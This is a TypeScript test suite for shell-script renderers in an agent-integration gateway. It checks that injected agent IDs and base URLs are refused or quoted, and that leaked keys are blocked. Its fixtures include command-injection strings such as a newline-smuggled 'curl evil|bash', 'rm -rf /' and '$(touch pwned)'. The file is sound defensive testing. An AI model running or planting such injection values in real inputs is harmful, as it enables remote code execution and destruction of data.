/**
 * integration-render-security — the deterministic security gates on the SHELL RENDERERS
 * (`render-plugin.ts` install.sh + `render-generic.ts` setup.sh) and the shared secret denylist.
 *
 * Pins the code-review must-fixes:
 *   A1 — a malicious agentId (newline / shell metacharacters) is REFUSED by both renderers, so
 *        even if it slipped past the connect-time check it can never produce a live shell line.
 *   A3 — a gatewayBaseUrl carrying shell metacharacters is EMITTED as an inert single-quoted
 *        literal (bound to a `*_DEFAULT` var), never a bare command-substitution.
 *   B3 — a missing gatewayBaseUrl THROWS (single normalization point), never a host-less curl.
 *   C1 — the shared structural denylist blocks `plx_live_` (connection-key) in the generic path
 *        too — symmetric with the CC verifier.
 *
 * And the PROJECT-SCOPE structural guards (docs/design/agent-integration-project-scope.md §5.2):
 * per-agent injections land in the PROJECT, never user-globally — rendered artifacts must not
 * register at user scope, must not touch the retired global-PATH location, must not default the
 * instruction into ~/.codex, and must fill every {{PLEXUS_ token they serve as instruction TEXT
 * (setup.sh carries its {{PLEXUS_CMD}} token only together with the run-time sed fill).
 */

import { describe, it, expect } from "bun:test";

import type { WellKnownDocument } from "@plexus/protocol";
import { renderPlugin } from "@plexus/runtime/integration/render-plugin.ts";
import { renderGeneric, assertGenericVerified } from "@plexus/runtime/integration/render-generic.ts";
import {
  renderInContext,
  assertInContextVerified,
  renderManual,
  assertManualVerified,
} from "@plexus/runtime/integration/render-in-context.ts";
import { assertSafeAgentId, shSingleQuote } from "@plexus/runtime/integration/shell-util.ts";

/** A minimal Floor sufficient for the renderers (baseUrl + an empty cap catalog). */
function floorWith(baseUrl: string | undefined): WellKnownDocument {
  return { gateway: baseUrl === undefined ? {} : { baseUrl } } as unknown as WellKnownDocument;
}

/** A fixed injected state home (like the fixed compileStamp) — determinism for the generic renderer. */
const FIXED_HOME = "/home/tester/.plexus";

const MALICIOUS_IDS = [
  "x\ncurl evil|bash",
  "x; rm -rf /",
  "x$(touch pwned)",
  "x`id`",
  "x'y",
  "x y", // space
  "", // empty
];

describe("A1 — renderers refuse an unsafe agentId (no live-shell injection)", () => {
  it("assertSafeAgentId throws for every malicious id, accepts real slugs", () => {
    for (const id of MALICIOUS_IDS) expect(() => assertSafeAgentId(id)).toThrow();
    for (const id of ["my-cc", "codex-e2e", "agent-A", "a", "a.b_c-1"]) {
      expect(assertSafeAgentId(id)).toBe(id);
    }
  });

  it("renderGeneric REFUSES a newline-injecting agentId (never emits a live shell line)", () => {
    for (const id of MALICIOUS_IDS) {
      expect(() =>
        renderGeneric({ agentId: id, gatewayBaseUrl: "http://127.0.0.1:7077", plexusHome: FIXED_HOME }),
      ).toThrow();
    }
  });

  it("renderPlugin REFUSES a newline-injecting agentId", () => {
    for (const id of MALICIOUS_IDS) {
      expect(() =>
        renderPlugin({
          floor: floorWith("http://127.0.0.1:7077"),
          capabilityIds: [],
          agentId: id,
          enrollmentCode: "plx_enroll_placeholder",
        }),
      ).toThrow();
    }
  });
});

describe("A3 — gatewayBaseUrl with shell metacharacters is emitted inert (single-quoted)", () => {
  const EVIL_BASE = "http://127.0.0.1:7077/$(touch pwned)`id`";

  it("generic setup.sh binds the base to a single-quoted *_DEFAULT var (no bare substitution)", () => {
    const { setupSh } = renderGeneric({ agentId: "ok-agent", gatewayBaseUrl: EVIL_BASE, plexusHome: FIXED_HOME });
    // The base appears ONLY as an inert single-quoted literal.
    expect(setupSh).toContain(`PLEXUS_GATEWAY_DEFAULT=${shSingleQuote(EVIL_BASE)}`);
    // …and NOT as a bare, un-quoted `${PLEXUS_GATEWAY:-<evil>}` default (the old vulnerable form).
    expect(setupSh).not.toContain(`PLEXUS_GATEWAY:-${EVIL_BASE}`);
  });

  it("CC install.sh binds the base to a single-quoted *_DEFAULT var too", () => {
    const rendered = renderPlugin({
      floor: floorWith(EVIL_BASE),
      capabilityIds: [],
      agentId: "ok-agent",
      enrollmentCode: "plx_enroll_placeholder",
    });
    const installSh = rendered.files.find((f) => f.path === "install.sh")!.content;
    expect(installSh).toContain(`PLEXUS_GATEWAY_DEFAULT=${shSingleQuote(EVIL_BASE)}`);
    expect(installSh).not.toContain(`PLEXUS_GATEWAY:-${EVIL_BASE}`);
  });
});

describe("B3 — a missing gatewayBaseUrl throws (never a host-less curl)", () => {
  it("renderGeneric throws when the Floor has no baseUrl", () => {
    expect(() => renderGeneric({ agentId: "ok-agent", gatewayBaseUrl: undefined, plexusHome: FIXED_HOME })).toThrow();
    expect(() => renderGeneric({ agentId: "ok-agent", gatewayBaseUrl: "", plexusHome: FIXED_HOME })).toThrow();
  });
  it("renderPlugin throws when the Floor has no baseUrl", () => {
    expect(() =>
      renderPlugin({
        floor: floorWith(undefined),
        capabilityIds: [],
        agentId: "ok-agent",
        enrollmentCode: "plx_enroll_placeholder",
      }),
    ).toThrow();
  });
});

describe("C1 — the shared structural denylist blocks plx_live_ in the generic path", () => {
  it("assertGenericVerified throws when any served artifact contains a connection-key pattern", () => {
    const fakeKey = "plx_live_" + "a".repeat(48);
    expect(() =>
      assertGenericVerified({ setupSh: `echo ${fakeKey}`, instruction: "", setupCommand: "", launcherPath: "" }),
    ).toThrow(/connection-key/i);
  });
  it("assertGenericVerified throws for a baked PAT / one-time code too", () => {
    const pat = "plx_agent_" + "a".repeat(32);
    const code = "plx_enroll_" + "b".repeat(32);
    expect(() =>
      assertGenericVerified({ setupSh: pat, instruction: "", setupCommand: "", launcherPath: "" }),
    ).toThrow();
    expect(() =>
      assertGenericVerified({ setupSh: "", instruction: code, setupCommand: "", launcherPath: "" }),
    ).toThrow();
  });
});

// ── PROJECT-SCOPE structural guards (agent-integration-project-scope §5.2) ──────────────────────
// String-structural, no execution: per-agent injections land in the PROJECT ($PWD at paste time),
// never user-globally. Same shape as the single-quoted-`*_DEFAULT` guards above.
describe("§5.2 — CC install.sh registers into the project, never user scope", () => {
  const BASE = "http://127.0.0.1:7077";
  /** The one line legitimately carrying `--scope user`: the migration-hint UNINSTALL suggestion. */
  const MIGRATION_HINT_RE = /^.*consider removing it: claude plugin uninstall plexus@plexus --scope user.*$/m;

  function renderedFiles() {
    return renderPlugin({
      floor: floorWith(BASE),
      capabilityIds: [],
      agentId: "ok-agent",
      enrollmentCode: "plx_enroll_placeholder",
      compileStamp: "2026-07-11T00:00:00.000Z",
    }).files;
  }

  it("install.sh passes --scope \"$PLEXUS_CC_SCOPE\" explicitly on BOTH registration commands", () => {
    const installSh = renderedFiles().find((f) => f.path === "install.sh")!.content;
    expect(installSh).toContain('claude plugin marketplace add "$DIR" --scope "$PLEXUS_CC_SCOPE"');
    expect(installSh).toContain('claude plugin install "$PLUGIN_NAME@$MARKETPLACE" --scope "$PLEXUS_CC_SCOPE"');
    // The knob is validated local|project — 'user' cannot be reintroduced through the env.
    expect(installSh).toContain('PLEXUS_CC_SCOPE="${PLEXUS_CC_SCOPE:-local}"');
    expect(installSh).toContain("local|project) ;;");
  });

  it("install.sh carries the $PWD = $HOME guard + the /reload-plugins and --plugin-dir output contract", () => {
    const installSh = renderedFiles().find((f) => f.path === "install.sh")!.content;
    expect(installSh).toContain('if [ "$PWD" = "$HOME" ]; then');
    expect(installSh).toContain("/reload-plugins");
    expect(installSh).toContain("--plugin-dir");
    expect(installSh).toContain("installed into project $PWD");
  });

  it("NO emitted file registers at user scope; the ONLY --scope user is the migration-hint uninstall suggestion", () => {
    for (const f of renderedFiles()) {
      // Strip the single sanctioned occurrence (install.sh's migration hint), then demand zero left.
      const rest = f.content.replace(MIGRATION_HINT_RE, "");
      expect(rest).not.toContain("--scope user");
      // The retired global-PATH location never appears in a CC-emitted file either.
      expect(f.content).not.toContain(".local/bin");
    }
  });

  it("the migration hint DETECTS (entry-scoped registry check) and SUGGESTS — it never uninstalls itself", () => {
    const installSh = renderedFiles().find((f) => f.path === "install.sh")!.content;
    expect(installSh).toContain('CC_REGISTRY="${CLAUDE_CONFIG_DIR:-$HOME/.claude}/plugins/installed_plugins.json"');
    expect(installSh).toMatch(MIGRATION_HINT_RE);
    // The uninstall verb appears ONLY inside echoed text (a suggestion), never as a live command:
    // every line containing it must be an echo.
    for (const line of installSh.split("\n")) {
      if (line.includes("claude plugin uninstall")) expect(line.trimStart().startsWith("echo ")).toBe(true);
    }
  });
});

describe("§5.2 — generic delivery: state-home launcher, project AGENTS.md, complete token fill", () => {
  const BASE = "http://127.0.0.1:7077";

  function rendered() {
    return renderGeneric({ agentId: "ok-agent", gatewayBaseUrl: BASE, plexusHome: FIXED_HOME });
  }

  it("setup.sh installs the launcher under $PLEXUS_HOME/agents/$AGENT_ID/bin/ — never ~/.local/bin", () => {
    const { setupSh } = rendered();
    expect(setupSh).toContain('LAUNCHER="$PLEXUS_HOME/agents/$AGENT_ID/bin/plexus"');
    expect(setupSh).not.toContain(".local/bin");
    expect(setupSh).not.toContain("BIN_DIR");
  });

  it("setup.sh lands the block at $PWD/AGENTS.md by default (a ~/.codex default-expansion never renders)", () => {
    const { setupSh } = rendered();
    expect(setupSh).toContain('AGENTS_FILE="${AGENTS_FILE:-$PWD/AGENTS.md}"');
    expect(setupSh).not.toMatch(/AGENTS_FILE="\$\{AGENTS_FILE:-[^}"]*\.codex\//);
    expect(setupSh).toContain('if [ "$PWD" = "$HOME" ]; then');
  });

  it("the served instruction is token-COMPLETE (absolute launcher filled); setup.sh carries the run-time sed fill", () => {
    const r = rendered();
    expect(r.instruction).not.toContain("{{PLEXUS_");
    expect(r.instruction).toContain(`${FIXED_HOME}/agents/ok-agent/bin/plexus`);
    expect(r.launcherPath).toBe(`${FIXED_HOME}/agents/ok-agent/bin/plexus`);
    // setup.sh legitimately CARRIES the token — paired with the sed that resolves it at run time.
    expect(r.setupSh).toContain('sed "s#{{PLEXUS_CMD}}#$LAUNCHER#g"');
    // A clean render passes the serve-time gate (which now enforces all of the above).
    expect(() => assertGenericVerified(r)).not.toThrow();
  });

  it("assertGenericVerified REJECTS a regression: .local/bin, a ~/.codex default, a dropped sed fill, an unfilled token", () => {
    const clean = rendered();
    expect(() =>
      assertGenericVerified({ ...clean, setupSh: clean.setupSh + '\nln -sf x "$HOME/.local/bin/plexus"\n' }),
    ).toThrow(/\.local\/bin/);
    expect(() =>
      assertGenericVerified({
        ...clean,
        setupSh: clean.setupSh.replace(
          'AGENTS_FILE="${AGENTS_FILE:-$PWD/AGENTS.md}"',
          'AGENTS_FILE="${AGENTS_FILE:-$HOME/.codex/AGENTS.md}"',
        ),
      }),
    ).toThrow(/\.codex/);
    expect(() =>
      assertGenericVerified({
        ...clean,
        setupSh: clean.setupSh.replace('sed "s#{{PLEXUS_CMD}}#$LAUNCHER#g" "$BLOCK_TMP" > "$BLOCK_FILLED"', ":"),
      }),
    ).toThrow(/sed fill/);
    expect(() =>
      assertGenericVerified({ ...clean, instruction: clean.instruction + "\n{{PLEXUS_CMD}} list\n" }),
    ).toThrow(/unfilled/);
    expect(() =>
      assertGenericVerified({
        ...clean,
        setupSh: clean.setupSh.replace(
          'LAUNCHER="$PLEXUS_HOME/agents/$AGENT_ID/bin/plexus"',
          'LAUNCHER="$HOME/bin/plexus"',
        ),
      }),
    ).toThrow(/launcher/);
  });
});

describe("in-context render — the instruction is filled + gated code-free/key-free", () => {
  it("renderInContext fills the gateway URL + host and throws on a missing baseUrl", () => {
    const { instruction } = renderInContext({ gatewayBaseUrl: "http://127.0.0.1:7077/" });
    expect(instruction).toContain("http://127.0.0.1:7077");
    expect(instruction).toContain("127.0.0.1:7077"); // {{GATEWAY_HOST}} authority
    expect(instruction).not.toContain("{{GATEWAY_URL}}");
    expect(instruction).not.toContain("{{GATEWAY_HOST}}");
    // The clean rendered instruction passes the serve-time gate.
    expect(() => assertInContextVerified({ instruction })).not.toThrow();
    // A missing/empty Floor baseUrl throws (single normalization point) — never a host-less doc.
    expect(() => renderInContext({ gatewayBaseUrl: undefined })).toThrow();
    expect(() => renderInContext({ gatewayBaseUrl: "" })).toThrow();
  });

  it("assertInContextVerified throws on a leaked connection-key / PAT / one-time code", () => {
    const key = "plx_live_" + "a".repeat(48);
    const pat = "plx_agent_" + "b".repeat(32);
    const code = "plx_enroll_" + "c".repeat(32);
    expect(() => assertInContextVerified({ instruction: `see ${key}` })).toThrow(/connection-key/i);
    expect(() => assertInContextVerified({ instruction: pat })).toThrow();
    expect(() => assertInContextVerified({ instruction: code })).toThrow();
    // A caller-supplied literal secret (the minted code / the real key) is also caught.
    expect(() =>
      assertInContextVerified({ instruction: "token=SEKRET-123" }, { forbiddenSecrets: ["SEKRET-123"] }),
    ).toThrow(/forbidden/i);
  });

  it("renderManual fills the gateway URL + host, throws on a missing base, and gates code-free", () => {
    const manual = renderManual("http://127.0.0.1:7077/");
    // The FULL walkthrough is filled + token-free.
    expect(manual).toContain("http://127.0.0.1:7077");
    expect(manual).toContain("127.0.0.1:7077"); // {{GATEWAY_HOST}} authority
    expect(manual).not.toContain("{{GATEWAY_URL}}");
    expect(manual).not.toContain("{{GATEWAY_HOST}}");
    // It carries the detailed wire the SHORT brief no longer does.
    for (const kw of ["DISCOVER", "ENROLL", "HANDSHAKE", "GRANT", "INVOKE"]) expect(manual).toContain(kw);
    expect(manual).toContain("io.input");
    expect(manual).toContain("grant_pending_user");
    // The clean rendered manual passes the serve-time gate.
    expect(() => assertManualVerified(manual)).not.toThrow();
    // A missing/empty Floor baseUrl throws (single normalization point).
    expect(() => renderManual(undefined)).toThrow();
    expect(() => renderManual("")).toThrow();
    // A leaked secret / caller-supplied literal is caught.
    const key = "plx_live_" + "e".repeat(48);
    expect(() => assertManualVerified(`see ${key}`)).toThrow(/connection-key/i);
    expect(() =>
      assertManualVerified("token=SEKRET-77", { forbiddenSecrets: ["SEKRET-77"] }),
    ).toThrow(/forbidden/i);
  });

  it("assertInContextVerified also gates extraTexts (enrollHint etc.) — B2 defense-in-depth", () => {
    const key = "plx_live_" + "d".repeat(48);
    // A clean instruction but a secret smuggled into an extra served text field must still throw…
    expect(() =>
      assertInContextVerified(
        { instruction: "clean instruction" },
        { extraTexts: [{ label: "enrollHint", text: `hint ${key}` }] },
      ),
    ).toThrow(/connection-key/i);
    // …and a caller-supplied literal secret in an extra field is caught too.
    expect(() =>
      assertInContextVerified(
        { instruction: "clean" },
        { forbiddenSecrets: ["SEKRET-9"], extraTexts: [{ label: "enrollHint", text: "x SEKRET-9 y" }] },
      ),
    ).toThrow(/forbidden/i);
    // A clean instruction + clean extra fields passes.
    expect(() =>
      assertInContextVerified(
        { instruction: "clean" },
        { extraTexts: [{ label: "enrollHint", text: "paste this into your agent" }] },
      ),
    ).not.toThrow();
  });
});
